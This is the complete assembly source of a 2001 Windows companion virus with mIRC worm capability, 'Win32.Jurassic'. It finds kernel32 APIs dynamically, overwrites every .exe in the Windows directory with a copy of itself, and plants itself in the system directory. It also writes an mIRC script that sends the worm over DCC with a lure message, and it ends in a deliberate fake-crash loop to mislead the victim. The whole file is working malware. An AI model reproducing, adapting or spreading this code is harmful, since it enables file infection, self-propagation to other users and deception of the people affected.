;Win32.Jurassic - Simple companion virus with mIRC worm capability
;Coded by aLL3gRo. Release: 23 July 2001
;Compiled on Borland TASM 5.0
;
;Author's notes:
;Hmmmm....Just coded this piece for fun actually. The reason why I called it Jurassic is
;because at the time of this writing, Jurassic Park 3 has been out and showing in cinemas.
;Also, I just watched JP3 on VCD yesterday.
;This virus is simple. It just infects all exe files in Windows directory, copies itself
;to Windows system directory and modifies mIRC settings to spread itself.
;It's encrypted/armoured by tElock 0.90, one really excellent PE packer tool.
;Also features dynamic API scanning via GetProcAddress


.386p
.model flat,stdcall
include win32.inc

extrn ExitProcess:proc
extrn GetModuleHandleA:proc
extrn GetProcAddress:proc

.data

signature db "Win32.Jurassic by [aLL3gRo]",0

wfd  WIN32_FIND_DATA <>

@CopyFileA                  db "CopyFileA",0
@FindFirstFileA             db "FindFirstFileA",0
@FindNextFileA              db "FindNextFileA",0
@CreateFileA                db "CreateFileA",0
@WriteFile                  db "WriteFile",0
@CloseHandle                db "CloseHandle",0
@GetModuleFileNameA         db "GetModuleFileNameA",0
@GetSystemDirectoryA        db "GetSystemDirectoryA",0
@lstrcat                    db "lstrcat",0
@GetWindowsDirectoryA       db "GetWindowsDirectoryA",0
@WritePrivateProfileStringA db "WritePrivateProfileStringA",0
@lstrlen                    db "lstrlen",0
@SetCurrentDirectoryA       db "SetCurrentDirectoryA",0

K32   db "Kernel32.dll",0
fname db "\Jurassic.zip",0
targ  db "*.exe",0
irc   db "c:\mirc\mirc.ini",0
value db "Settings.ini",0
patch db "c:\mirc\Settings.ini",0
no2   db "n2",0
no3   db "n3",0
rfile db "rfiles",0
octets dd ?

iirc  db "[script]",13,10
      db "n0=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }",13,10
      db "n1=/msg $nick Checkout a preview of the coming Jurassic Park 4. Rename the file to .exe and run it",13,10
      db "n2=/dcc send $nick "   
vict  db 100 dup(0)
lent  equ $ - offset iirc

K32h     dd 0
fhandle  dd 0
filehand dd 0

ep   dd 0
cf   dd 0
fff  dd 0
fnf  dd 0
cfa  dd 0
wf   dd 0
clh  dd 0
gmfn dd 0
gsda dd 0
lcat dd 0
gwda dd 0
wpps dd 0
llen dd 0
scda dd 0

filename db 256 dup(0)
sysdir   db 100 dup(0)
temp     db 100 dup(0)

.code

start:
    
    call  GetAPIs              ;First thing's first: get all API addresses

    push  256
    push  offset filename
    push  NULL
    mov   ebx,[gmfn]           ;Get own filename
    call  ebx

    push  100
    push  offset sysdir
    mov   ecx,[gsda]           ;Get system directory
    call  ecx

    mov   ecx,[lcat]
    lea   esi,fname
    push  esi
    mov   edx,offset sysdir
    xchg  edx,ebx
    push  ebx
    call  ecx                  ;Concatenates target file to system directory

    lea   edi,sysdir
    xor   eax,eax
    push  eax
    push  edi
    push  offset filename      ;and copies into system directory
    mov   esi,[cf]
    call  esi

    mov   eax,offset wfd
    push  eax
    push  offset irc
    mov   ebx,[fff]
    mov   ecx,ebx             ;check if mirc is installed: only default directory
    call  ecx
    inc   eax
    jz    next

    push  offset irc
    push  offset value
    push  offset no2
    push  offset rfile
    mov   esi,[wpps]          ;Patches mirc.ini
    call  esi

    push  offset irc
    push  offset value
    push  offset no3
    push  offset rfile
    call  esi

    push  offset sysdir
    mov   edx,[llen]
    call  edx
    xchg  eax,ecx

    cld
    lea   esi,sysdir          ;strcpy sysdir to new variable
    lea   edi,vict
    rep   movsb

    push  0
    push  0
    push  CREATE_ALWAYS
    push  0
    push  0
    push  GENERIC_WRITE       ;creates our malicious mirc script
    lea   esi,patch
    push  esi
    mov   edi,[cfa]
    call  edi
    cmp   eax,-1
    je    next
    mov   [fhandle],eax

    push  0
    push  offset octets
    push  lent
    push  offset iirc
    push  [fhandle]
    mov   edi,[wf]
    call  edi                ;and writes the content to the file

    push  [fhandle]
    mov   eax,[clh]
    call  eax

next:

    lea   edi,sysdir
    mov   ecx,100

empty2:

    xor   al,al             ;Empty sysdir variable for reuse
    stosb
    loop  empty2

    mov   edx,[gwda]
    push  100               ;Get windows directory
    push  offset sysdir
    call  edx

    lea   edi,sysdir
    push  edi
    mov   ebx,[scda]        ;Set to Windows Directory
    call  ebx

    lea   ecx,wfd
    push  ecx
    push  offset targ        ;find for first matching Exe file
    mov   ebx,[fff]
    call  ebx
    inc   eax
    jz    ov
    dec   eax
    mov   [filehand],eax

again:

    push  offset [wfd.wfd_cFileName]
    mov   edx,[llen]
    call  edx
    xchg  eax,ecx
    sub   ecx,4

    cld
    lea   esi,[wfd.wfd_cFileName]   ;Copy it to temp variable
    lea   edi,temp
    rep   movsb

    push  FALSE
    push  offset temp
    push  offset [wfd.wfd_cFileName]   ;copy original file to new one
    mov   ebx,[cf]
    call  ebx   

    push  FALSE
    push  offset [wfd.wfd_cFileName]
    push  offset filename              ;and infect the current Exe file
    mov   eax,[cf]
    mov   edx,eax
    call  edx

    lea   edi,temp
    mov   ecx,100

empty:

    xor   al,al             ;Empty temp for reuse
    stosb
    loop  empty
   
    push  offset wfd
    push  [filehand]
    mov   eax,[fnf]
    call  eax               ;Search for next file
    cmp   eax,0
    jne   again

ov:
    
    mov   eax,0bf60334h      ;Try to cause a stack overflow exception
    pushad                   ;to fool user: fake
    jmp   ov
 
    push  0
    call  ExitProcess  


GetAPIs proc stdcall

    push  offset K32
    call  GetModuleHandleA     ;Obtain Kernel32 base address in memory
    test  eax,eax
    jz    bye
    mov   [K32h],eax
    
    push  offset @CopyFileA   ;and get all needed API addresses
    push  eax
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [cf],eax

    push  offset @FindFirstFileA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [fff],eax

    push  offset @FindNextFileA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [fnf],eax

    push  offset @CreateFileA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [cfa],eax

    push  offset @WriteFile
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [wf],eax

    push  offset @CloseHandle
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [clh],eax

    push  offset @GetModuleFileNameA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [gmfn],eax

    push  offset @GetSystemDirectoryA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [gsda],eax

    push  offset @lstrcat
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [lcat],eax

    push  offset @GetWindowsDirectoryA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [gwda],eax

    push  offset @WritePrivateProfileStringA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [wpps],eax

    push  offset @SetCurrentDirectoryA
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [scda],eax

    push  offset @lstrlen
    push  K32h
    call  GetProcAddress
    test  eax,eax
    jz    bye
    mov   [llen],eax

    ret

bye:

    push  0
    call  ExitProcess

GetAPIs endp

end start
